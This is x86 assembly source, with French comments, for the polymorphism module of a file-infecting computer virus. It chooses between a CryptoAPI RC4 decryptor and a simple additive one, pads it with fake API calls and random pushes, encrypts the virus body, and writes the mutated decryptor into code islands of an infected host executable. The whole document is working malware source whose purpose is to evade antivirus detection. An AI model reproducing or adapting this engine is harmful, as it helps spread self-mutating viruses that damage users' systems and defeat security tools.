   ;MODULE : POLYMORPHISATION
   ;Ce module est chargé de choisir un décrypteur, le randomiser un peu (insertion de fake
   ;api calls) et d'appeler le poly engine dessus.



   ; apis de advapi32:
   A32_CRYPTACQUIRECONTEXTA                                EQU 0
   A32_CRYPTCREATEHASH                                     EQU 1
   A32_CRYPTHASHDATA                                       EQU 2
   A32_CRYPTDERIVEKEY                                      EQU 3
   A32_CRYPTDECRYPT                                        EQU 4
   A32_CRYPTENCRYPT                                        EQU 5




   ILOT_SEPARATEUR macro
       db 0FFh
   endm

   ;POLY_CHOISIT_DECRYPTEUR : choisit un decrypteur
   ; in :
   ; out : variables poly_decrypteur, poly_nb_parties_decrypteur, fonction_encryption, poly_taille_pseudo_decrypteur, modifiées
   poly_choisit_decrypteur proc near
       pusha
       mov eax,PROB_DECRYPTEUR_SIMPLE
       call rand_tuna
       test eax,eax
       jz pcd_simple

   pcd_cryptoapis:
       lea eax,[ebp+encrypt_cryptoapis]
       mov [ebp+fonction_encryption],eax
       lea eax,[ebp+pseudo_decrypteur_cryptoapis]
       mov [ebp+poly_decrypteur],eax
       lea eax,[ebp+name_a32]
       mov [ebp+poly_name_dll],eax
       lea eax,[ebp+apis_advapi_compatibles]
       mov [ebp+poly_liste_apis_compat],eax
       mov [ebp+poly_nb_apis_compat],nb_apis_advapi_compatibles
       mov [ebp+poly_nb_parties_decrypteur],NB_PARTIES_DECRYPTEUR_INITIAL_CRYPTOAPIS
       mov [ebp+poly_ca_peheader],edx
       jmp pcd_fin
   pcd_simple:
       lea eax,[ebp+encrypt_simple]
       mov [ebp+fonction_encryption],eax
       lea eax,[ebp+pseudo_decrypteur_simple]
       mov [ebp+poly_decrypteur],eax
       xor eax,eax
       mov [ebp+poly_name_dll],eax
       mov [ebp+poly_nb_parties_decrypteur],NB_PARTIES_DECRYPTEUR_INITIAL_SIMPLE
       mov [ebp+poly_ca_peheader],edx
       xor eax,eax
       dec eax
       call rand_tuna
       mov [ebp+simple_cle],eax
   pcd_fin:
       popa
       ret
   poly_choisit_decrypteur endp


   ;POLY_PSEUDO_POLYMORPHIZE : Pseudo-polymorphize un décrypteur
   ;in : esi-->pseudo-code du decrypteur
   ;     edi-->buffer dispo
   ;     poly_nb_parties_decrypteur renseigné
   ;out: edi-->buffer rempli avec le decrypteur pseudo-polymorphisé
   ;
   ;Ajoute les fake apis au décrypteur. Cette fonction trvaille sur du pseudo-code.
   poly_pseudo_polymorphize proc near
       pusha
       xor edx,edx
       movzx ebx,byte ptr [ebp+poly_nb_parties_decrypteur]
       mov eax,MAX_NB_PARTIES-1
       sub eax,ebx
       div ebx
       mov edx,eax             ;edx=nb fake apis par ilot
       movsw                   ;pas touche au premier pseudo-opcode !!
   psp_0:
       push edx
   psp_fake_api:
       call psp_insere_fake_api
       dec edx
       jnz psp_fake_api
       pop edx
   psp_1:
       xor eax,eax
       lodsb
       stosb
       cmp eax,OP_FIN_DECRYPTEUR
       jz psp_fin
       cmp eax,0FFh
       jz psp_0
       lodsb
       stosb
       mov ecx,eax
       imul ecx,5
       rep movsb
       jmp psp_1
   psp_fin:
       popa
       ret
   poly_pseudo_polymorphize endp


   ;PSP_INSERE_FAKE_API : insere une fake api dans le decrypteur
   ; in : edi-->endroit du décrypteur
   ; out: none
   psp_insere_fake_api proc near
       push esi edx ecx
   ;choisit une fake_api
       lea esi,[ebp+fake_apis]
       call taille_liste
       mov eax,ebx
       shr eax,1
       test eax,eax
       jz pifa_fin
       call rand_tuna
       lea esi,[esi+eax*8]
       xor ebx,ebx
       cmp [esi],ebx   ;esi-> (future rva de l'api,nb args de l'api)
       jz pifa_fin

   ;genere le pseudo-code de l'ilot
       xor eax,eax
       mov al,OP_random_pushs_api
       stosw           ;random_pushs_api
       mov al,OP_push_next_location
       stosw           ;random_pushs_api

   ;les pushs
       mov ecx,[esi+4]
       jecxz pifa_noargs
   pifa_pushs:
       mov al,OP_random_push
       stosw
       loop pifa_pushs
   pifa_noargs:
       mov al,OP_call_mem
       mov ah,OP_call_mem_NB_ARGS
       stosw
       mov al,TYPE_ADRESSE
       stosb
       mov eax,[esi]
       add eax,[ebp+imagebase]
       stosd

       xor eax,eax
       mov al,OP_retour
       stosw           ;retour
       mov al,0FFh     ;fin ilot
       stosb
       inc byte ptr [ebp+poly_nb_parties_decrypteur]
   pifa_fin:
       pop ecx edx esi
       ret
   psp_insere_fake_api endp


   ;POLY_POLYMORPHISE : polymorphise le décrypteur et l'écrit dans les ilots
   ; in : esi->pseudo-code, ebx->hote filemappé, edx-->PE header locations rempli
   ;out : ilots remplis
   poly_polymorphise proc near
       pusha
       xor eax,eax
       mov [ebp+poly_appels],al
       mov [ebp+nb_fake_pushs],eax
       lea ecx,[ebp+locations]     ;adresses des ilots
   pp_re:
       lea edi,[ebp+poly_buffer]
   pp_boucle:
   ;separe l'api
       xor eax,eax
       lodsb
       cmp eax,0FFh
       jz pp_fin_boucle
       stosb
       cmp eax,OP_FIN_DECRYPTEUR   ; fin ?
       jz pp_fin
       lodsb
       stosb
       push ecx
       mov ecx,eax
       imul ecx,5
       rep movsb
       pop ecx
       jmp pp_boucle
   pp_fin_boucle:
       mov al,OP_FIN_DECRYPTEUR
       stosb

   ;polymorphize
       pusha
       lea esi,[ebp+poly_buffer]   ;pseudo-opcodes à polymorphiser
       mov eax,[ecx]
       call rva2raw
       lea edi,[eax+ebx]           ;edi-->adresse physique de l'ilot
       mov ecx,[ecx]
       add ecx,[ebp+imagebase]     ;ecx-->adresse virtuelle de l'ilot
       mov ebx,(offset memoire-offset debut_virus)+ (TAILLE_IMPORTS + DECRYPTOR_SIZE)
       add ebx,[ebp+infection_rva]
       add ebx,[ebp+imagebase]     ;ebx=virtual adress de la mémoire

       lea eax,[ebp+memoire]       ;eax-->memoire
       mov edx,OPCODE_MAX_SIZE     ;taille max du code généré par pseudo-opcode
       call poly_asm
       popa
       add ecx,8                   ;ilot suivant
       jmp pp_re
   pp_fin:
       popa
       ret
   poly_polymorphise endp


   ;============================== FONCTIONS D'ENCRYPTION ======================
   ;ENCRYPT_CRYPTOAPIS : encrypteur pour le decrypteur via cryptoapis
   ;  in  :   edx->pe header, ebx->file mapping,  edi-->code to encrypt
   ;  out :   code to encrypt encrypted !
   encrypt_cryptoapis proc near
           pusha
           push edi
           push edx
           push ebx

           xor eax,eax
           push dword ptr CRYPT_VERIFYCONTEXT
           push dword ptr PROV_RSA_FULL
           push eax
           push eax
           lea eax,[ebp+vtmp1]
           push eax
           call_ CAcquireContextA

           lea eax,[ebp+vtmp2]
           push eax
           xor eax,eax
           push eax
           push eax
           push CALG_MD5
           push dword ptr [ebp+vtmp1]
           call_ CCreateHash

           pop ecx
           pop edx
           xor eax,eax
           push eax
           add al,4
           push eax
           mov eax,[edx+80h]
           call rva2raw
           add eax,ecx
           push eax
           push dword ptr [ebp+vtmp2]
           call_ CHashData


           lea eax,[ebp+vtmp3]
           push eax
           push dword ptr TAILLE_CLE
           push dword ptr [ebp+vtmp2]
           push CALG_RC4
           push dword ptr [ebp+vtmp1]
           call_ CDeriveKey

           pop edi
           mov [ebp+vtmp4],dword ptr code_to_crypt_len
           push dword ptr code_to_crypt_len
           lea eax,[ebp+vtmp4]
           push eax
           push edi
           xor eax,eax
           push eax
           inc eax
           push eax
           dec eax
           push eax
           push dword ptr [ebp+vtmp3]
           call_ CEncrypt

           popa
           ret
   encrypt_cryptoapis endp

   ;ENCRYPT_SIMPLE : encrypteur pour le decrypteur simple
   ;  in  :   edx->pe header, ebx->file mapping,  edi-->code to encrypt
   ;  out :   code to encrypt encrypted !
   encrypt_simple proc near
       pusha
       mov esi,edi
       mov ecx,code_to_crypt_len/4+1
   es_boucle:
       lodsd
       add eax,[ebp+simple_cle]
       stosd
       loop es_boucle
       popa
       ret
   encrypt_simple endp

   ;============================== PSEUDO DECRYPTEURS =============================
   ;
   ;Code des décrypteurs sous forme de pseudo-code, compréhensible apr le poly engine.
   ;Chaque pseudo-code est en fait un appel à une transformation définie dans le fichier
   ;regles.kpasm

   pseudo_decrypteur_cryptoapis:
           cryptoapis_init

           ;cryptacquirecontext
           random_pushs_api
           push_next_location
           push_cst CRYPT_VERIFYCONTEXT
           push_cst PROV_RSA_FULL
           push_cst 0
           push_cst 0
           push_cst_csp
           call_api A32_CRYPTACQUIRECONTEXTA
           retour
           ILOT_SEPARATEUR

           ;cryptcreatehash
           random_pushs_api
           push_next_location
           push_cst_hash;
           push_cst 0
           push_cst 0
           push_cst CALG_MD5
           push_mem_csp
           call_api A32_CRYPTCREATEHASH
           retour
           ILOT_SEPARATEUR

           ;crypthashdata
           random_pushs_api
           push_next_location
           push_cst 0
           push_cst 4
           push_mem_position_cle
           push_mem_hash
           call_api A32_CRYPTHASHDATA
           retour
           ILOT_SEPARATEUR

           ;cryptderivekey
           random_pushs_api
           push_next_location
           push_cst_key
           push_cst TAILLE_CLE
           push_mem_hash
           push_cst CALG_RC4
           push_mem_csp
           call_api A32_CRYPTDERIVEKEY
           retour
           ILOT_SEPARATEUR

           ;cryptdecrypt
           random_pushs_api
           push_mem_offset_code
           push_cst_taille_code
           push_mem_offset_code
           push_cst 0
           push_cst 1
           push_cst 0
           push_mem_key
           call_api A32_CRYPTDECRYPT
           retour
           ILOT_SEPARATEUR
           FIN_DECRYPTEUR

   NB_PARTIES_DECRYPTEUR_INITIAL_CRYPTOAPIS EQU 5

   poly_ca_peheader    dd ?


   pseudo_decrypteur_simple:
           simple_init

           simple_init_registres
           simple_lit
           simple_decrypte
           simple_ecrit
           simple_boucle
           simple_saut
           ILOT_SEPARATEUR
           FIN_DECRYPTEUR

   NB_PARTIES_DECRYPTEUR_INITIAL_SIMPLE    EQU 1

   ;============================== MISC ============================
   rand_tuna proc near    ;in: eax=val max   out: eax=rand()
       push edx
       push ebx
       push eax
       mov eax,[ebp + RAND_SEED]   ;on initialise eax avec la "graine"
       mov ebx,eax         ;on copie eax dans ebx c-a-d RAND_SEED
       shl eax,13          ;eax = (n << D2) = res1
       xor eax,ebx         ;eax = (res1 ^ n) = res2
       shr eax,19          ;eax = (res2 >> D3) = res3
       and ebx,4294967294  ;ebx = (n & E) = res4
       shl ebx,12          ;ebx = (res4 << D1) = res5
       xor eax,ebx         ;eax = (res5 ^ res3) = resultat final
       mov dword ptr [ebp + RAND_SEED],eax  ;on sauvegarde le resultat final
       xor edx,edx
       pop ebx
       div ebx
       mov eax,edx
       pop ebx
       pop edx
       or eax,eax
       ret             ;fini, vous trouvez le npa dans RANDOM_SEED
   rand_tuna endp
